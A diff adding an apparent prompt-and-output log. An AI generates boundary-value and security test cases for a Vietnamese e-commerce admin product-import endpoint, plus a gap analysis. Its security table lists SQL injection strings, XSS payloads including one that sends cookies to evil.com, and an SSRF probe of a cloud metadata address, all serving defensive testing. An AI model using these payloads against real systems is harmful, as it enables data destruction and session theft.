@@ -1,0 +1,514 @@
+prompt_log_03
+prompt:
+# FEATURE TO TEST: 3. Import từ CSV (ORDER STATE MACHINE)
+
+## 1. Extracted Source Code Context
+
+* **Endpoint:** `POST /api/admin/import-products`
+
+* **Authentication Requirement:**
+
+  * Endpoint được bảo vệ bởi middleware `authenticateToken`.
+  * Người dùng phải đăng nhập hợp lệ để thực hiện import.
+
+* **Input Structure (Request Body):**
+
+```json
+{
+  "products": [
+    {
+      "name": "Product A",
+      "price": 100,
+      "description": "Description",
+      "imageUrl": "https://...",
+      "category_id": 1
+    }
+  ]
+}
+```
+
+* **Backend Validation Logic (server.js):**
+
+  * Kiểm tra dữ liệu import:
+
+    ```javascript
+    if (!rows || !Array.isArray(rows) || rows.length === 0)
+    ```
+
+    → Return HTTP 400
+
+    ```json
+    {
+      "error": "Không có dữ liệu để import"
+    }
+    ```
+
+  * Với từng dòng dữ liệu:
+
+    ```javascript
+    if (!row.name)
+    ```
+
+    → Thêm lỗi:
+
+    ```
+    Hàng X: Thiếu tên sản phẩm
+    ```
+
+    → Không insert bản ghi đó.
+
+  * Thực hiện insert:
+
+    ```sql
+    INSERT INTO products
+    (name, price, description, imageUrl, category_id)
+    VALUES (?, ?, ?, ?, ?)
+    ```
+
+  * Giá trị mặc định:
+
+    ```javascript
+    row.description || ""
+    ```
+
+    → description mặc định = ""
+
+    ```javascript
+    row.imageUrl || ""
+    ```
+
+    → imageUrl mặc định = ""
+
+    ```javascript
+    row.category_id || 1
+    ```
+
+    → category_id mặc định = 1
+
+* **Successful Response Format:**
+
+```json
+{
+  "message": "Import hoàn tất: X/Y sản phẩm được thêm",
+  "inserted": X,
+  "errors": []
+}
+```
+
+---
+
+## 2. Input Data Mapping Specification (For AI Agent Skill)
+
+### Numeric Fields
+
+| Field       | Min       | Max       | Notes                                        |
+| ----------- | --------- | --------- | -------------------------------------------- |
+| price       | Undefined | Undefined | Không tìm thấy validation trong source code. |
+| category_id | Undefined | Undefined | Mặc định = 1 nếu không truyền.               |
+
+### String Fields & Limits
+
+| Field       | Required | Min Length | Max Length | Notes                                  |
+| ----------- | -------- | ---------- | ---------- | -------------------------------------- |
+| name        | Yes      | Undefined  | Undefined  | Thiếu name → lỗi "Thiếu tên sản phẩm". |
+| description | No       | Undefined  | Undefined  | Mặc định = "".                         |
+| imageUrl    | No       | Undefined  | Undefined  | Mặc định = "".                         |
+
+### Array Fields
+
+| Field    | Required | Validation                                                |
+| -------- | -------- | --------------------------------------------------------- |
+| products | Yes      | Phải tồn tại, phải là Array và phải có ít nhất 1 phần tử. |
+
+### Enum Values
+
+None found in source code.
+
+### Inter-field Dependencies
+
+| Dependency      | Rule                              |
+| --------------- | --------------------------------- |
+| products        | Phải là Array hợp lệ.             |
+| products.length | Phải > 0.                         |
+| name            | Bắt buộc trên mỗi product record. |
+| description     | Nếu null/undefined → gán "".      |
+| imageUrl        | Nếu null/undefined → gán "".      |
+| category_id     | Nếu null/undefined → gán 1.       |
+
+### Error Response Format
+
+#### Invalid Import Payload
+
+Status Code: `400`
+
+```json
+{
+  "error": "Không có dữ liệu để import"
+}
+```
+
+#### Row Validation Error
+
+Được trả trong mảng `errors`
+
+```json
+{
+  "message": "Import hoàn tất: X/Y sản phẩm được thêm",
+  "inserted": X,
+  "errors": [
+    "Hàng 2: Thiếu tên sản phẩm"
+  ]
+}
+```
+
+#### Database Insert Error
+
+Được trả trong mảng `errors`
+
+```json
+{
+  "message": "Import hoàn tất: X/Y sản phẩm được thêm",
+  "inserted": X,
+  "errors": [
+    "Hàng 5: <database_error_message>"
+  ]
+}
+```
+
+### Validation Visibility Analysis
+
+Không tìm thấy trong source code:
+
+* Validation giá trị âm của `price`
+* Validation giá trị 0 của `price`
+* Validation số thập phân của `price`
+* Validation định dạng URL của `imageUrl`
+* Validation độ dài `name`
+* Validation độ dài `description`
+* Validation category_id tồn tại trong bảng category
+* Validation file CSV format
+* Validation duplicate product name
+* Validation giới hạn số lượng record import
+
+Các điều kiện trên cần được đánh dấu là **Unknown / Not Found in Source Code** khi sinh test case.
+AI-output:
+## 1. Feature Variables & Domain Decomposition
+
+**Endpoint:** `POST /api/admin/import-products`
+**Authentication:** Bearer JWT token required (`Authorization: Bearer <token>`) — admin role implied
+
+| Variable | Type | Format | Constraints | Dependencies |
+|----------|------|--------|-------------|--------------|
+| `Authorization` header | STRING | `Bearer <JWT>` | Required. Must be valid, non-expired token. | Gates entire endpoint; absent = 401 |
+| `products` | ARRAY | JSON Array of objects | Required. Must be Array. Must have length ≥ 1. | All row-level validation depends on this being valid |
+| `products.length` | INTEGER | Count | Min = 1 (explicit validation: `rows.length === 0` → 400). Max = **Unknown** | If 0 or non-array → 400 before row processing |
+| `products[n].name` | STRING | Free text | **Required per row** — missing triggers row error `"Hàng X: Thiếu tên sản phẩm"`. Row skipped, not inserted. Min/Max length: **Unknown** | Row-level: if missing, row excluded from insert |
+| `products[n].price` | NUMBER | Numeric | Optional (no required check found). Min/Max: **Unknown**. Negative/zero/float: **Unknown** | Stored via parameterized INSERT; no coercion confirmed |
+| `products[n].description` | STRING | Free text | Optional. Default = `""` if null/undefined/missing | Independent — defaults applied before insert |
+| `products[n].imageUrl` | STRING | URL string | Optional. Default = `""` if null/undefined/missing. Format validation: **Unknown** | Independent — defaults applied before insert |
+| `products[n].category_id` | INTEGER | Foreign key | Optional. Default = `1` if null/undefined/missing (falsy). FK existence: **Unknown** | `category_id || 1` — falsy values (`0`, `""`, `null`) ALL default to `1` |
+
+**Fields system-managed (not in scope as inputs):** auto-generated `id`
+
+> **Assumption A1:** Endpoint requires admin role based on path `/api/admin/...` — but no role-check is explicitly confirmed in the provided source. Tests will verify both regular user and admin tokens.
+
+> **Assumption A2:** `price` is stored as-is (no server validation found). A missing `price` field likely stores `undefined` or `NULL` in SQLite depending on JS behavior — exact outcome **Unknown**.
+
+> **Assumption A3:** `category_id || 1` means ANY falsy value (`0`, `""`, `false`, `null`, `undefined`) defaults to `1`. Specifically `category_id: 0` will silently be stored as `1` — a semantic bug.
+
+> **Assumption A4:** The `products` array is the direct equivalent of CSV rows parsed client-side before being posted. No CSV file upload occurs server-side; the endpoint only receives the parsed JSON payload.
+
+> **Assumption A5:** Row index in error messages is 1-based (`"Hàng 1"` = first row) — inferred from "Hàng X" pattern. Tests will verify indexing convention.
+
+> **Assumption A6:** There is no batch transaction — rows are inserted individually. A failure on row N does not roll back rows 1..N-1. All successful rows are committed even if some rows fail.
+
+> **Assumption A7:** No confirmed upper limit on `products.length`. Stress tests at 1000 and 10000 items will probe for timeout, memory, or payload-size limits.
+
+---
+
+## 2. BVA Derivation & Rationale (Step-by-Step)
+
+### Variable: `products` array (Array-size BVA)
+```
+Type: Array of objects
+Explicit constraint: length === 0 → 400 "Không có dữ liệu để import"
+Min-1 = 0 items (empty array [])    → INVALID → 400
+Min   = 1 item                      → VALID → proceed to row validation
+Min+1 = 2 items                     → VALID
+
+Nominal = 5 items
+
+Max = Undefined → stress test boundaries:
+  100 items  → VALID (expected)
+  1000 items → VALID (stress test — timeout risk)
+  10000 items → VALID or timeout/payload limit (Unknown)
+
+Special:
+  null                              → INVALID → 400
+  missing field (no "products" key) → INVALID → 400
+  non-array string "products"       → INVALID → 400
+  non-array object {}               → INVALID → 400
+  array of non-objects [1, 2, 3]    → behavior Unknown (no type check on row elements found)
+  array with null elements [null]   → behavior Unknown
+```
+
+### Variable: `products[n].name` (per-row, String BVA)
+```
+Type: STRING
+Required per row — falsy check: !row.name
+
+Min-1 = "" (empty string → falsy → INVALID)  → row error "Hàng X: Thiếu tên sản phẩm"
+Min   = "A" (1 char → truthy → VALID)         → row inserted
+Min+1 = "AB" (2 chars → VALID)
+
+Nominal = "Áo thun nam size M"
+
+Max length = Undefined → stress test:
+  255-char name  → VALID (expected)
+  1000-char name → VALID (stress — Unknown)
+
+Special:
+  null                           → falsy → row error (same as missing)
+  undefined / missing field      → falsy → row error
+  "   " (spaces only)           → TRUTHY in JS → row inserted (spaces are not falsy)
+  "0" (string zero)             → truthy → row inserted
+  "<script>alert(1)</script>"   → truthy → stored (XSS risk in admin UI)
+  "' OR '1'='1"                 → truthy → parameterized query should block SQLi
+  emoji "🛍️ Túi xách"           → truthy → system-dependent UTF-8 handling
+  numeric 12345 (integer type)  → truthy → type mismatch (Unknown behavior)
+```
+
+> **Assumption A8:** JS `!row.name` catches: `null`, `undefined`, `""`, `0`, `false`. It does NOT catch `"   "` (whitespace-only strings) — these pass the check and get inserted with a whitespace-only name.
+
+### Variable: `products[n].price` (Numeric BVA)
+```
+Type: NUMBER (stored as INTEGER in DB — column type not confirmed from spec)
+No validation found in source code.
+
+Logical business min = 0.01 (items must cost something)
+Absolute min for unsigned = 0
+
+Min-1 = -1       → INVALID logically; behavior Unknown
+Min   = 0        → Edge (free product?); behavior Unknown
+Min+1 = 1        → VALID
+
+Nominal = 150000  (typical price in VND)
+
+Max (SQLite INTEGER) = 2,147,483,647 → stress boundary
+  Max-1 = 2,147,483,646   → VALID
+  Max   = 2,147,483,647   → VALID
+  Max+1 = 2,147,483,648   → INVALID (overflow); behavior Unknown
+
+Special:
+  null / missing   → stored as NULL (Unknown if allowed by DB schema)
+  "150000" string  → type mismatch; JS may insert string or DB may coerce
+  1.5 (float)      → INTEGER column may truncate or error
+  -99999           → negative price; behavior Unknown
+  Infinity         → JS special value; behavior Unknown
+  NaN              → JS special value; behavior Unknown
+```
+
+### Variable: `products[n].category_id` (Numeric/FK BVA)
+```
+Type: INTEGER (foreign key)
+Default logic: row.category_id || 1
+
+Falsy values (ALL default to 1):
+  null        → stored as 1
+  undefined   → stored as 1
+  0           → stored as 1 (SEMANTIC BUG: 0 is falsy)
+  ""          → stored as 1 (falsy)
+  false       → stored as 1 (falsy)
+
+Truthy values (stored as provided):
+  1           → VALID (default category; exists in seed data)
+  2           → VALID if category 2 exists; Unknown if FK enforced
+  -1          → stored as -1; FK likely fails or no constraint
+  9999        → non-existent category; FK enforcement Unknown
+  "1" string  → truthy; stored as string "1" or coerced
+
+Nominal = 1
+```
+
+> **Assumption A3 (restated):** `category_id: 0` is a confirmed semantic bug — `0 || 1` evaluates to `1`, silently overriding what may be a valid user intent (if category 0 exists). Must be flagged.
+
+### Variable: `products[n].imageUrl` (String/URL BVA)
+```
+Type: STRING
+Default: row.imageUrl || "" (falsy → "")
+No format validation found.
+
+  null / missing / "" / false  → default "" (stored as empty string)
+  "https://example.com/img.jpg" → valid nominal URL; stored as-is
+  "not-a-url"                  → stored as-is (no format check)
+  "javascript:alert(1)"        → XSS attack vector if rendered as <img src>
+  "<script>alert(1)</script>"  → XSS if rendered
+  "http://internal/etc/passwd" → SSRF if server fetches the URL
+  1000-char URL string         → stress; Unknown max length
+```
+
+### Variable: `products[n].description` (String BVA)
+```
+Type: STRING
+Default: row.description || "" (falsy → "")
+No validation found.
+
+  null / missing / "" / false  → default "" stored
+  "Valid description text"     → nominal VALID
+  "<script>alert(1)</script>"  → XSS if rendered unescaped
+  5000-char description        → stress; Unknown max
+```
+
+---
+
+## 3. Comprehensive Test Case Matrix
+
+### 3A — `products` Array-Level Tests
+
+| Test ID | Title | Preconditions | Inputs (exact values) | Steps | Expected Result | HTTP Status |
+|---------|-------|---------------|----------------------|-------|-----------------|-------------|
+| TC-IMPORT-001 | Happy path — single valid product, all fields | Valid admin JWT | `{"products": [{"name": "Áo thun nam", "price": 150000, "description": "Mô tả sản phẩm", "imageUrl": "https://example.com/img.jpg", "category_id": 1}]}` | POST /api/admin/import-products | `{"message": "Import hoàn tất: 1/1 sản phẩm được thêm", "inserted": 1, "errors": []}` | 200 |
+| TC-IMPORT-002 | Happy path — 5 valid products (nominal batch) | Valid admin JWT | `{"products": [<5 rows with unique names, price=100000, valid fields>]}` | POST /api/admin/import-products | `{"inserted": 5, "errors": []}` | 200 |
+| TC-IMPORT-003 | `products` = empty array `[]` (Min-1) | Valid admin JWT | `{"products": []}` | POST /api/admin/import-products | `{"error": "Không có dữ liệu để import"}` | 400 |
+| TC-IMPORT-004 | `products` = null | Valid admin JWT | `{"products": null}` | POST /api/admin/import-products | `{"error": "Không có dữ liệu để import"}` | 400 |
+| TC-IMPORT-005 | `products` key missing entirely | Valid admin JWT | `{}` | POST /api/admin/import-products | `{"error": "Không có dữ liệu để import"}` | 400 |
+| TC-IMPORT-006 | `products` = string (wrong type) | Valid admin JWT | `{"products": "not an array"}` | POST /api/admin/import-products | `{"error": "Không có dữ liệu để import"}` | 400 |
+| TC-IMPORT-007 | `products` = object `{}` (wrong type) | Valid admin JWT | `{"products": {}}` | POST /api/admin/import-products | `{"error": "Không có dữ liệu để import"}` | 400 |
+| TC-IMPORT-008 | `products` = integer `1` (wrong type) | Valid admin JWT | `{"products": 1}` | POST /api/admin/import-products | `{"error": "Không có dữ liệu để import"}` | 400 |
+| TC-IMPORT-009 | `products` = 1 item (Min) | Valid admin JWT | `{"products": [{"name": "SP Min", "price": 1}]}` | POST /api/admin/import-products | `{"inserted": 1, "errors": []}` | 200 |
+| TC-IMPORT-010 | `products` = 2 items (Min+1) | Valid admin JWT | `{"products": [{"name": "SP 1", "price": 100}, {"name": "SP 2", "price": 200}]}` | POST /api/admin/import-products | `{"inserted": 2, "errors": []}` | 200 |
+| TC-IMPORT-011 | `products` = 1000 items (stress) | Valid admin JWT | `{"products": [<1000 rows: name="SP_N", price=100>]}` | POST /api/admin/import-products | All 1000 inserted or timeout/limit error | 200 / 413 / 504 |
+| TC-IMPORT-012 | `products` = array with null element | Valid admin JWT | `{"products": [null]}` | POST /api/admin/import-products | **Unknown** — row error or crash | 200 / 500 |
+| TC-IMPORT-013 | `products` = array of primitives `[1, 2]` | Valid admin JWT | `{"products": [1, 2]}` | POST /api/admin/import-products | **Unknown** — row error `"Hàng 1: Thiếu tên sản phẩm"` for each | 200 |
+| TC-IMPORT-014 | No `Authorization` header | N/A | Valid body + no auth header | POST /api/admin/import-products | 401 Unauthorized | 401 |
+| TC-IMPORT-015 | Regular user token (non-admin) | Valid user JWT (test@eshop.com) | Valid body + user JWT | POST /api/admin/import-products | **Unknown** — 403 Forbidden (if role check exists) or 200 (if no role check) | 403 / 200 |
+| TC-IMPORT-016 | Empty request body | Valid admin JWT | `` (no body) | POST /api/admin/import-products | `{"error": "Không có dữ liệu để import"}` | 400 |
+| TC-IMPORT-017 | Malformed JSON body | Valid admin JWT | `{products: [broken json` (unparseable) | POST /api/admin/import-products | 400 JSON parse error | 400 |
+
+### 3B — Row-Level `name` Field Tests
+
+| Test ID | Title | Preconditions | Inputs (exact values) | Steps | Expected Result | HTTP Status |
+|---------|-------|---------------|----------------------|-------|-----------------|-------------|
+| TC-IMPORT-018 | `name` missing — single row | Valid admin JWT | `{"products": [{"price": 100}]}` | POST /api/admin/import-products | `{"inserted": 0, "errors": ["Hàng 1: Thiếu tên sản phẩm"]}` | 200 |
+| TC-IMPORT-019 | `name` = null | Valid admin JWT | `{"products": [{"name": null, "price": 100}]}` | POST /api/admin/import-products | `{"inserted": 0, "errors": ["Hàng 1: Thiếu tên sản phẩm"]}` | 200 |
+| TC-IMPORT-020 | `name` = `""` empty string (Min-1) | Valid admin JWT | `{"products": [{"name": "", "price": 100}]}` | POST /api/admin/import-products | `{"inserted": 0, "errors": ["Hàng 1: Thiếu tên sản phẩm"]}` | 200 |
+| TC-IMPORT-021 | `name` = `"A"` 1 char (Min) | Valid admin JWT | `{"products": [{"name": "A", "price": 100}]}` | POST /api/admin/import-products | `{"inserted": 1, "errors": []}` | 200 |
+| TC-IMPORT-022 | `name` = `"AB"` 2 chars (Min+1) | Valid admin JWT | `{"products": [{"name": "AB", "price": 100}]}` | POST /api/admin/import-products | `{"inserted": 1, "errors": []}` | 200 |
+| TC-IMPORT-023 | `name` = 255-char string | Valid admin JWT | `{"products": [{"name": "<255 x 'A'>", "price": 100}]}` | POST /api/admin/import-products | Inserted successfully | 200 |
+| TC-IMPORT-024 | `name` = 1000-char string (stress) | Valid admin JWT | `{"products": [{"name": "<1000 x 'A'>", "price": 100}]}` | POST /api/admin/import-products | Inserted or truncated (Unknown max) | 200 |
+| TC-IMPORT-025 | `name` = `"   "` (3 spaces only) | Valid admin JWT | `{"products": [{"name": "   ", "price": 100}]}` | POST /api/admin/import-products | **Unknown** — `"   "` is truthy in JS → row INSERTED with whitespace name (no trim validation) | 200 |
+| TC-IMPORT-026 | `name` = `"0"` string zero | Valid admin JWT | `{"products": [{"name": "0", "price": 100}]}` | POST /api/admin/import-products | `"0"` is truthy → row inserted | 200 |
+| TC-IMPORT-027 | `name` = integer type `12345` | Valid admin JWT | `{"products": [{"name": 12345, "price": 100}]}` | POST /api/admin/import-products | **Unknown** — truthy integer → inserted as number (type mismatch) | 200 |
+| TC-IMPORT-028 | Mixed batch — 1 valid + 1 missing name | Valid admin JWT | `{"products": [{"name": "Valid SP", "price": 100}, {"price": 200}]}` | POST /api/admin/import-products | `{"inserted": 1, "errors": ["Hàng 2: Thiếu tên sản phẩm"]}` | 200 |
+| TC-IMPORT-029 | Mixed batch — first row missing name | Valid admin JWT | `{"products": [{"price": 100}, {"name": "Valid SP", "price": 200}]}` | POST /api/admin/import-products | `{"inserted": 1, "errors": ["Hàng 1: Thiếu tên sản phẩm"]}` — verify index starts at 1 | 200 |
+| TC-IMPORT-030 | All rows missing name | Valid admin JWT | `{"products": [{"price": 100}, {"price": 200}, {"price": 300}]}` | POST /api/admin/import-products | `{"inserted": 0, "errors": ["Hàng 1: Thiếu tên sản phẩm", "Hàng 2: ...", "Hàng 3: ..."]}` | 200 |
+| TC-IMPORT-031 | Vietnamese Unicode name | Valid admin JWT | `{"products": [{"name": "Áo dài truyền thống Việt Nam", "price": 500000}]}` | POST /api/admin/import-products | Inserted with correct UTF-8 name | 200 |
+| TC-IMPORT-032 | Emoji in name | Valid admin JWT | `{"products": [{"name": "🛍️ Túi xách cao cấp", "price": 300000}]}` | POST /api/admin/import-products | **Unknown** — inserted or emoji stripped | 200 |
+
+### 3C — `price` Field Tests
+
+| Test ID | Title | Preconditions | Inputs (exact values) | Steps | Expected Result | HTTP Status |
+|---------|-------|---------------|----------------------|-------|-----------------|-------------|
+| TC-IMPORT-033 | `price` = 1 (Min) | Valid admin JWT | `{"products": [{"name": "SP Test", "price": 1}]}` | POST /api/admin/import-products | Inserted with price = 1 | 200 |
+| TC-IMPORT-034 | `price` = 0 (zero boundary) | Valid admin JWT | `{"products": [{"name": "SP Test", "price": 0}]}` | POST /api/admin/import-products | **Unknown** — inserted with price=0 or rejected | 200 |
+| TC-IMPORT-035 | `price` = -1 (negative) | Valid admin JWT | `{"products": [{"name": "SP Test", "price": -1}]}` | POST /api/admin/import-products | **Unknown** — inserted with negative price or rejected | 200 |
+| TC-IMPORT-036 | `price` = -99999 (large negative) | Valid admin JWT | `{"products": [{"name": "SP Test", "price": -99999}]}` | POST /api/admin/import-products | **Unknown** — stored or rejected | 200 |
+| TC-IMPORT-037 | `price` = 2147483647 (INT32 Max) | Valid admin JWT | `{"products": [{"name": "SP Test", "price": 2147483647}]}` | POST /api/admin/import-products | Inserted with price = 2147483647 | 200 |
+| TC-IMPORT-038 | `price` = 2147483648 (INT32 Max+1, overflow) | Valid admin JWT | `{"products": [{"name": "SP Test", "price": 2147483648}]}` | POST /api/admin/import-products | **Unknown** — 500 DB error or stored as float | 200 / 500 |
+| TC-IMPORT-039 | `price` = 99.99 (float) | Valid admin JWT | `{"products": [{"name": "SP Test", "price": 99.99}]}` | POST /api/admin/import-products | **Unknown** — truncated to 99 or stored as float | 200 |
+| TC-IMPORT-040 | `price` = `"150000"` string type | Valid admin JWT | `{"products": [{"name": "SP Test", "price": "150000"}]}` | POST /api/admin/import-products | **Unknown** — coerced to integer or stored as string | 200 |
+| TC-IMPORT-041 | `price` = null | Valid admin JWT | `{"products": [{"name": "SP Test", "price": null}]}` | POST /api/admin/import-products | **Unknown** — stored as NULL or default | 200 |
+| TC-IMPORT-042 | `price` missing | Valid admin JWT | `{"products": [{"name": "SP Test"}]}` | POST /api/admin/import-products | **Unknown** — stored as NULL/undefined | 200 |
+
+### 3D — `category_id` Default Logic Tests
+
+| Test ID | Title | Preconditions | Inputs (exact values) | Steps | Expected Result | HTTP Status |
+|---------|-------|---------------|----------------------|-------|-----------------|-------------|
+| TC-IMPORT-043 | `category_id` missing → default 1 | Valid admin JWT | `{"products": [{"name": "SP Test", "price": 100}]}` | POST → check DB | `category_id = 1` in DB | 200 |
+| TC-IMPORT-044 | `category_id` = null → default 1 | Valid admin JWT | `{"products": [{"name": "SP Test", "price": 100, "category_id": null}]}` | POST → check DB | `category_id = 1` in DB | 200 |
+| TC-IMPORT-045 | `category_id` = 0 → default 1 (falsy bug) | Valid admin JWT | `{"products": [{"name": "SP Test", "price": 100, "category_id": 0}]}` | POST → check DB | **Bug expected**: `category_id = 1` stored, NOT 0 (0 is falsy) | 200 |
+| TC-IMPORT-046 | `category_id` = 1 (explicit) | Valid admin JWT | `{"products": [{"name": "SP Test", "price": 100, "category_id": 1}]}` | POST → check DB | `category_id = 1` in DB | 200 |
+| TC-IMPORT-047 | `category_id` = 2 (valid FK) | Valid admin JWT, category 2 exists | `{"products": [{"name": "SP Test", "price": 100, "category_id": 2}]}` | POST → check DB | `category_id = 2` in DB | 200 |
+| TC-IMPORT-048 | `category_id` = 9999 (non-existent FK) | Valid admin JWT, category 9999 not in DB | `{"products": [{"name": "SP Test", "price": 100, "category_id": 9999}]}` | POST /api/admin/import-products | **Unknown** — stored (no FK check) or row error if FK enforced | 200 / 200 with row error |
+| TC-IMPORT-049 | `category_id` = -1 (negative) | Valid admin JWT | `{"products": [{"name": "SP Test", "price": 100, "category_id": -1}]}` | POST → check DB | **Unknown** — stored as -1 or error | 200 |
+| TC-IMPORT-050 | `category_id` = `""` empty string → default 1 | Valid admin JWT | `{"products": [{"name": "SP Test", "price": 100, "category_id": ""}]}` | POST → check DB | `category_id = 1` (empty string is falsy) | 200 |
+| TC-IMPORT-051 | `category_id` = `"1"` string (truthy) | Valid admin JWT | `{"products": [{"name": "SP Test", "price": 100, "category_id": "1"}]}` | POST → check DB | **Unknown** — stored as string "1" or coerced to integer 1 | 200 |
+
+### 3E — Optional Fields Default Tests
+
+| Test ID | Title | Preconditions | Inputs (exact values) | Steps | Expected Result | HTTP Status |
+|---------|-------|---------------|----------------------|-------|-----------------|-------------|
+| TC-IMPORT-052 | `description` missing → default `""` | Valid admin JWT | `{"products": [{"name": "SP Test", "price": 100}]}` | POST → check DB | `description = ""` in DB | 200 |
+| TC-IMPORT-053 | `description` = null → default `""` | Valid admin JWT | `{"products": [{"name": "SP Test", "price": 100, "description": null}]}` | POST → check DB | `description = ""` in DB | 200 |
+| TC-IMPORT-054 | `description` = `"Valid description"` | Valid admin JWT | `{"products": [{"name": "SP Test", "price": 100, "description": "Mô tả chi tiết sản phẩm"}]}` | POST → check DB | description stored as provided | 200 |
+| TC-IMPORT-055 | `imageUrl` missing → default `""` | Valid admin JWT | `{"products": [{"name": "SP Test", "price": 100}]}` | POST → check DB | `imageUrl = ""` in DB | 200 |
+| TC-IMPORT-056 | `imageUrl` = null → default `""` | Valid admin JWT | `{"products": [{"name": "SP Test", "price": 100, "imageUrl": null}]}` | POST → check DB | `imageUrl = ""` in DB | 200 |
+| TC-IMPORT-057 | `imageUrl` = valid URL | Valid admin JWT | `{"products": [{"name": "SP Test", "price": 100, "imageUrl": "https://cdn.example.com/img.jpg"}]}` | POST → check DB | imageUrl stored as provided | 200 |
+| TC-IMPORT-058 | `imageUrl` = non-URL string | Valid admin JWT | `{"products": [{"name": "SP Test", "price": 100, "imageUrl": "not-a-valid-url"}]}` | POST → check DB | **Unknown** — stored as-is (no format check) | 200 |
+| TC-IMPORT-059 | Minimal row — name only | Valid admin JWT | `{"products": [{"name": "Minimal SP"}]}` | POST → check DB | Inserted with `price=NULL`, `description=""`, `imageUrl=""`, `category_id=1` | 200 |
+| TC-IMPORT-060 | Concurrent import — same product names | Valid admin JWT | Two simultaneous POSTs with `name="Duplicate SP"` | Fire 2 requests at same time | **Unknown** — both insert (no duplicate check) creating 2 identical rows | 200 + 200 |
+
+---
+
+## 4. AI Gap Analysis & Vulnerability Report
+
+### 4.1 Specification Gaps
+
+| Gap ID | Description | Affected Variables | Risk Level | Recommendation |
+|--------|-------------|-------------------|------------|----------------|
+| GAP-001 | **No role/permission check confirmed** — `/api/admin/` path suggests admin-only, but no `role === 'admin'` guard found. Regular users may be able to import products. | `Authorization` header | **CRITICAL** | Add middleware: `if (req.user.role !== 'admin') return res.status(403).json({error: "Forbidden"})` |
+| GAP-002 | **`category_id: 0` silently overrides to 1** — `0 \|\| 1` evaluates to `1` due to JS falsy coercion. Intent ambiguous: user supplied a value but it gets silently changed. | `category_id` | **HIGH** | Replace `row.category_id \|\| 1` with `row.category_id !== undefined && row.category_id !== null ? row.category_id : 1` |
+| GAP-003 | **No `price` validation** — negative, zero, float, null values all accepted without error. Negative-price products create financial logic errors. | `price` | **HIGH** | Add: `if (typeof row.price !== 'number' \|\| row.price < 0) → row error` |
+| GAP-004 | **No `name` whitespace trim** — `"   "` (spaces-only) is truthy in JS, bypasses `!row.name` check, inserts a product with meaningless whitespace name | `name` | **HIGH** | Add: `if (!row.name \|\| !row.name.trim()) → row error` |
+| GAP-005 | **No `category_id` foreign key existence check** — non-existent `category_id` values (e.g., 9999) may be stored silently, breaking category-product relations | `category_id` | **HIGH** | Validate FK before insert: `SELECT id FROM categories WHERE id = ?`; error if not found |
+| GAP-006 | **No max length on `name`** — 1000-char product names may be stored, causing UI display issues and potential column overflow | `name` | **MEDIUM** | Cap at 255 chars: `if (row.name.length > 255) → row error "Hàng X: Tên sản phẩm quá dài"` |
+| GAP-007 | **No `imageUrl` format validation** — `"javascript:alert(1)"` stored as imageUrl renders as executable XSS if displayed in `<img src>` | `imageUrl` | **HIGH** | Validate URL format: allow only `http://` and `https://` schemes; reject `javascript:`, `data:` |
+| GAP-008 | **No duplicate product name detection** — concurrent or sequential imports with identical names create ghost duplicates in catalog | `name` | **MEDIUM** | Add optional unique check or duplicate-detection report in response `errors` array |
+| GAP-009 | **No import size limit** — 10,000-row payloads accepted, risking server OOM / timeout / DB lock contention | `products.length` | **MEDIUM** | Add: `if (rows.length > 1000) return res.status(400).json({error: "Giới hạn 1000 sản phẩm mỗi lần import"})` |
+| GAP-010 | **No transaction rollback on partial failure** — successful rows before a failed row are permanently committed. Partial imports may leave catalog in inconsistent state. | All row fields | **MEDIUM** | Wrap all inserts in a DB transaction; rollback all on any error, or document partial-commit behavior explicitly |
+| GAP-011 | **`price` type not validated** — string `"150000"` may be coerced or stored as TEXT in SQLite, breaking numeric sorting/filtering | `price` | **MEDIUM** | Add: `if (typeof row.price !== 'number') → row error "Hàng X: Giá sản phẩm không hợp lệ"` |
+| GAP-012 | **Row index convention (0-based vs 1-based) not specified** — error message `"Hàng X"` index derivation not documented; may differ from user expectation | Error messages | **LOW** | Document and test: first row = `"Hàng 1"` (1-based) vs `"Hàng 0"` (0-based) |
+| GAP-013 | **No `price` required validation** — missing price field likely inserts NULL into `price` column; products without price cannot be sold | `price` | **MEDIUM** | Add: `if (row.price === undefined \|\| row.price === null) → row error "Hàng X: Thiếu giá sản phẩm"` |
+
+---
+
+### 4.2 Security Vulnerability Test Cases
+
+| Vuln ID | Category | Test Input | Attack Vector | Expected Safe Response |
+|---------|----------|-----------|---------------|----------------------|
+| SEC-001 | SQL Injection | `name: "'; DROP TABLE products;--"` | `name` field in parameterized INSERT | Parameterized query blocks; stored as literal string |
+| SEC-002 | SQL Injection | `description: "' UNION SELECT * FROM users--"` | `description` field | Parameterized query blocks; stored as literal |
+| SEC-003 | SQL Injection | `imageUrl: "' OR '1'='1"` | `imageUrl` field | Parameterized query blocks; stored as literal |
+| SEC-004 | XSS — Stored (name) | `name: "<script>fetch('https://evil.com?t='+document.cookie)</script>"` | `name` rendered in admin product list UI | Stored escaped; not executed on render |
+| SEC-005 | XSS — Stored (imageUrl) | `imageUrl: "javascript:alert(document.domain)"` | `<img src="javascript:...">` if rendered directly | Rejected (invalid scheme) or stored escaped; not executed |
+| SEC-006 | XSS — Stored (imageUrl) | `imageUrl: "data:text/html,<script>alert(1)</script>"` | `data:` URI XSS in img tag | Rejected or sanitized |
+| SEC-007 | XSS — Stored (description) | `description: "<img src=x onerror=alert(document.domain)>"` | `description` rendered in product detail page | Escaped on output; onerror not triggered |
+| SEC-008 | Auth Bypass | No Authorization header, valid body | Missing JWT on admin endpoint | 401 Unauthorized; middleware blocks before processing |
+| SEC-009 | Privilege Escalation | Valid regular user JWT (non-admin) | Accessing `/api/admin/` without admin role | 403 Forbidden (if role check exists); **Currently Unknown** |
+| SEC-010 | Mass Assignment | `{"products": [{"name": "SP", "price": 100, "id": 1, "created_at": "2000-01-01"}]}` | Extra system fields injected in row object | Extra fields ignored; only mapped columns inserted |
+| SEC-011 | SSRF | `imageUrl: "http://169.254.169.254/latest/meta-data/"` | AWS metadata endpoint via imageUrl if server fetches URL | URL stored only; server must NOT fetch it at import time |
+| SEC-012 | ReDoS | `name: "aaaa...a!" (50,000 chars with trailing special char)` | CPU-intensive regex if any name validation regex is added | Processing completes in < 500ms; no server hang |
+| SEC-013 | Oversized Payload DoS | `products`: array of 50,000 items each with 1000-char name | Body size limit test | 413 Payload Too Large or max-size enforcement |
+
+---
+
+### 4.3 Enhancement Test Cases (Gap Closure)
+
+| TC ID | Gap Addressed | Title | Exact Input | Expected Result (after fix) |
+|-------|--------------|-------|-------------|----------------------------|
+| TC-IMPORT-ENH-001 | GAP-001 | Regular user cannot import | Regular user JWT + valid body | 403 `{"error": "Forbidden"}` |
